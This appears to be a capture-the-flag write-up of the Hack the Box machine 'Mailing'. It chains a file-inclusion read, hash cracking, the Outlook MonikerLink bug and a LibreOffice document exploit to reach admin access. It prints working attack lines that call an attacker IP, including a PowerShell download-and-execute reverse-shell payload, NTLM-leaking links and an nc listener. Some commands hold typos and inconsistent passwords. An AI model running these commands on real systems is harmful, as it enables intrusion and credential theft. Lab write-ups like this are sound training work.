---
title: "Hack the Box (HTB) - Mailing"
description: "hMailServer LFI, Outlook CVE, LibreOffice Exploit  "
date: 2024-08-31 12:00:00 -100
image: /assets/images/HTB - Mailing/Mailing Thumbnail.jpg
categories: [CTF]
tags: [lfi, smtp, windows, hMailServer, Outlook, LibreOffice,  CVE-2024-21413, CVE-2023-2255]    # TAG names should always be lowercase
---

## Enumeration

Let's run [Nmap](https://nmap.org/book/toc.html) against our box at `10.10.11.14`

Looking at the results, we see the following services open:

| Port     | State  | Service       | Version                          |
|----------|--------|---------------|----------------------------------|
| 25/tcp   | Open   | SMTP          | hMailServer smtpd                |
| 80/tcp   | Open   | HTTP          | Microsoft IIS httpd 10.0         |
| 110/tcp  | Open   | POP3          | hMailServer pop3d                |
| 135/tcp  | Open   | MSRPC         | Microsoft Windows RPC            |
| 139/tcp  | Open   | NetBIOS-SSN   | Microsoft Windows netbios-ssn    |
| 143/tcp  | Open   | IMAP          | hMailServer imapd                |
| 445/tcp  | Open   | Microsoft-DS  | Microsoft Windows SMB            |
| 465/tcp  | Open   | SSL/SMTP      | hMailServer smtpd                |
| 587/tcp  | Open   | SMTP          | hMailServer smtpd                |
| 993/tcp  | Open   | SSL/IMAP      | hMailServer imapd                |
| 5040/tcp | Open   | Unknown       | Unknown                          |
| 5985/tcp | Open   | HTTP          | Microsoft HTTPAPI httpd 2.0      |
| 7680/tcp | Open   | Unknown       | Unknown                          |
| 47001/tcp| Open   | HTTP          | Microsoft HTTPAPI httpd 2.0      |
| 49664/tcp| Open   | MSRPC         | Microsoft Windows RPC            |
| 49665/tcp| Open   | MSRPC         | Microsoft Windows RPC            |
| 49666/tcp| Open   | MSRPC         | Microsoft Windows RPC            |
| 49667/tcp| Open   | MSRPC         | Microsoft Windows RPC            |
| 49668/tcp| Open   | MSRPC         | Microsoft Windows RPC            |
| 62845/tcp| Open   | MSRPC         | Microsoft Windows RPC            |

Let's start by checking out the IIS web server. As noted by our nmap scan, we see that the request doesn't follow a redirect to `http://mailing.htb` which just indicates some [virtual hosting](https://en.wikipedia.org/wiki/Virtual_hosting). Let's add mailing.htb to our local dns file

```bash
sudo nano /etc/hosts
```

![etchosts](/assets/images/HTB%20-%20Mailing/etchosts.png)

Now let's navigate to the web server

![web server](/assets/images/HTB%20-%20Mailing/web%20sever%20mailing.png)

We see three names that may come in use at some

- Ruy Alonso
- Maya Bendito
- Gregory Smith

Checking the bottom of the page, we see a download instructions button

![Installation Button](/assets/images/HTB%20-%20Mailing/Installation%20button.png)

![Instructions](/assets/images/HTB%20-%20Mailing/Instructions.png)

It's a document explaining how to connect how to connect to the mail server. Scrolling to the bottom we do see a potential valid email

![Maya Account Leak](/assets/images/HTB%20-%20Mailing/Leaked%20Email%20Maya.png)

`maya@mailing.htb` appears to be a valid email

This doesn't really do much for us yet. Let's take a look at the download request in burp

![Request](/assets/images/HTB%20-%20Mailing/Initial%20Request%20Mailing.png)

The request script `/download.php` specifies a specific file `instructions.pdf` which may be susceptible to LFI. Let's edit it a bit

![LFI](/assets/images/HTB%20-%20Mailing/LFI.png)

It looks like the LFI works. We were able to read the contents of the local DNS file on the windows machine

### Leveraging LFI to gain credentials

Back on the site, it said that the email server was `powered by hMailServer`. hMailServer is an open-source email server software for Windows.

Doing a quick google search tells me that the configuration file for the hMailServer in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` Let's make a request to that file now

![Administrator hash](/assets/images/HTB%20-%20Mailing/Administrator%20HASH.png)

Success, we have the administrators hashed password `841bb5acfa6779ae432fd7a4e6600ba7` which is likely MD5

Let's head over to hashcat and try to crack this

```bash
hashcat -m 0 -a 0841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt
```

![Admin Password](/assets/images/HTB%20-%20Mailing/Admin%20Password.png)

We were able to crack the password almost instantly as `homenetworkingadministrator`

Let's try testing authentication against the SMTP server. We will use [Swaks](https://github.com/jetmore/swaks) for this. The following command will test authentication only as we don't want to send any emails

```bash
swaks --server mailing.htb --auth LOGIN --auth-user administrator@mailing.htb --auth-password homenetowrkingadministrator --quit-after AUTH
```

![Swaks](/assets/images/HTB%20-%20Mailing/Swaks.png)

The authentication is successful. This proves we can login to the email server and send emails. However, this won't help us much as no one will click on anything we send.

With our namp scan revealing a list of email services (SMTP,POP3, IMAP) as well as knowing this is a windows environment we're dealing with, we can safely make the assumption that the outlook email client is being utilized

Googling for recent MS outlook exploits leads us to [CVE-2024-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability). This is a vulnerability in MS Outlook with the potential to leak NTLM hashes & provide

![Github exploit CVE-2024-21413](/assets/images/HTB%20-%20Mailing/CVE.png)

The script for this exploit requires SMTP authentication to bypass email security mechanisms like SPF, DKIM, and DMARC. By sending an email from a legitimate account (e.g., administrator@mailing.htb) to the victim (e.g., maya@mailing.htb), the attacker can trigger the vulnerability. The attacker controls a server (e.g., running Responder) to capture the victim's NTLM hash when the victim's Outlook client attempts to authenticate

This vulnerability occurs because Outlook automatically processes certain remote resources in emails without user interaction. When Outlook receives an email containing a malicious link to a file hosted on the attacker's server (e.g., via their IP), it attempts to fetch that file automatically. During this process, Outlook sends the victim's NTLM credentials to the attacker's server, enabling the attacker to capture them

Outlook generally handles web links starting with `http://` or `https://` by opening them in the default browser. For protocols like `skype://`, Outlook prompts with a security warning

![Security Warning](/assets/images/HTB%20-%20Mailing/Outlook%20Security%20Notice.png)

When it comes to file links (e.g, `file://`), Outlook blocks access to remote resources, preventing credentials from leaking through the SMB protocol, which obviously exposes NTLM credentials

### The MonikerLink Bug

When a slight modification is amde to the file link such as appending an exclamation mark (`!`) and additional characters, as in:

```html
<a href="file:///\\10.10.111.111\test\test.rtf!something">CLICK ME</a>
```

Outlook bypasses the security restriction, attempts to access the remote file, and leaks the user's NTLM creds through SMB

### Exploit Mechanism:

The modified hyper link is treated as a **"Moniker Link"**, a concept in Windows' Component Object Model (COM). The "Moniker Link" is parsed by Outlook using the `mkParseDisplayName()` API, which treats the link as a COM object lookup

#### Summary

1. **Normal behavior**: Outlook blocks `file://` links to prevent NTLM credential leaks.
2. **Moniker link bug**: Adding `!` to a `file://` link (e.g., `file://\\server\file.rtf!`) tricks Outlook into handling it as a Moniker link.
3. **Exploit mechanism**: Outlook calls a Windows API (`MkParseDisplayName()`) and uses Word as a background COM server to open the remote `.rtf` file.
4. **Outcome**: If the `.rtf` is malicious, it can lead to remote code execution by exploiting Word, bypassing security protections like Protected View.

Let's fire up responder

```bash
sudo responder -i eth0
```

Now git clone the CVE repo (after confirming the script of course)

```bash
git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/blob/main/CVE-2024-21413.py
```


Now let's run the script!

```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.36/pwned" --subject "Pwned"
```

![Maya Hash](/assets/images/HTB%20-%20Mailing/maya%20hash.png)

Maya's hash has been obtained. Let's put in in a file & try to crack it via hashcat

```bash
hashcat -m 5600 maya_hash.txt /path/to/rockyou.txt
```

![maya password](/assets/images/HTB%20-%20Mailing/maya%20password.png)

Excellent, we've successfully crack mayas password as `m4y4s4ai`

We can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to remotely access mayas windows machine. Evil-WinRM allows attackers to connect to Windows Remote Management (WinRM) services, enabling them to execute commands as if they were logged in directly

We discovered the default port for WinRM over HTTP earlier:

| 5985/tcp | Open   | HTTP          | Microsoft HTTPAPI httpd 2.0      |

Let's run Evil-WinRM aganist maya

```bash
evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
```

![Shell Obtained](/assets/images/HTB%20-%20Mailing/Shell%20mailing.png)

Boom, we have a shell. Now time for privesc!

### Escalation

We could run our favorite escalation & enumeration tool [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) but I'll save some time in this writeup and just say it didn't show me anything of value

### Winpeas doesn't find anything, skip ahead

```bash
python3 -m http.server 9001
```

```powershell
Invoke-WebRequest URI "http://10.10.14.36:9001/winPEASx64.exe" -OutFile C:\Users\maya\Desktop\winpeas.exe
```

![Invoke Webrequest](/assets/images/HTB%20-%20Mailing/Invoke%20Web%20Request.png)

Now run winpeas

```powershell
.\winpeas.exe
```

Ah, winpeas doesn't show anything of value. However, navigating the file system a bit we leads us to `LibreOffice` that's installed. Checking the version.ini file found inside the directory shows us the version

![LibreOffice Version](/assets/images/HTB%20-%20Mailing/Libre%20Office%20Version.png)

Version `7.4.0.1` is vulnerable as indicated by [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)

In short, the vulnerability is related to how LibreOffice handles "Floating Frames," which function similarly to HTML `Iframe` element. These frames are used to display linked content within a document

In the affected versions of LibreOffice, these floating frames would automatically load and dispaly linked documents **without asking for user permission**

There's a git repo we can use to generate our payload. The python script in this repo will generate a malicious `odt` file (LibreOffice's format) that includes a command to be executed when opened

![Git Repo](/assets/images/HTB%20-%20Mailing/Git%20Repo.png)

First, let's grab the repo on our attacker machine

```bash
git clone https://github.com/elweth-sec/CVE-2023-2255.git
```

We'll generate the reverse shell payload

```bash
python3 CVE-2023-2255.py --cmd "cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36:8000/shell.ps1')" --output exploit.odt
```

The important part about this exploit is that it relies on someone opening the `.odt` file with LibreOffice. First we need to host our `shell.ps1` script that will be obtained once this code executes

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
```

This will copy the powershell reverse shell script that we will be hosting to our current directory and name it shell.. ***We also need to edit the script to include our IP / port***

Next we must put the file somewhere where someone with higher privileges than we currently have will likely open it

Navigating the file system shows a directory with the name `C:\Important Documents` which is a likely candidate. Let's upload the file there

#### Understanding the exploit chain

- Malicious `.odt` file was created. 
- .odt is put onto victim machine in a folder that will likely be accessed by an administrator
- .odt file executes, grabbing the reverse shell from our simple web server
- power shell script executes, connecting back to us as admin

```bash
# Start python web server on attacker machine, hosting the malicious powershell reverse shell script
python3 -m http.server 8000

# Start another web server, hosting the .odt file
python3 -m http.server 9002

# Start the nc listener to grab the reverse powershell exploit
nc -lvnp 9001

# Grab the .odt file from the victim machine  (from the Important Documents directory)
curl -o pwned.odt http://10.10.14.36:9001/exploit.
```

![Exploited](/assets/images/HTB%20-%20Mailing/Reverse%20Shell%20ODT%20esclation.png)

GG, we've rooted Mailing!

## Vulnerabilities & Mitigation's

| **Vulnerability**               | **Description**                                                                                                                                                                           | **Mitigation**                                                                                                                 |
|---------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------|
| **Local File Inclusion (LFI)**  | An LFI vulnerability was exploited in the PHP script by manipulating the `file` parameter, allowing access to sensitive files like `hMailServer.ini`.                                        | Proper input validation and sanitization. Limit file access to whitelisted directories.                                         |
| **Weak Password Cracking**      | The password hash obtained from `hMailServer.ini` was weak and cracked, providing access to the system.                                                                                     | Enforce strong password policies, use salted hashes, and ensure regular password updates.                                       |
| **Outdated LibreOffice Exploit** | After cracking the password, an outdated version of LibreOffice was abused to gain further system access or elevate privileges.                                                             | Regularly update software to patch known vulnerabilities, and restrict user access to potentially vulnerable applications.      |


### Remediation References

- [NIST SP 800-63B, Section 5.1.1.2 - Memorized Secret](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [OWASP File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Linux Sudoers Manual](https://linux.die.net/man/5/sudoers)

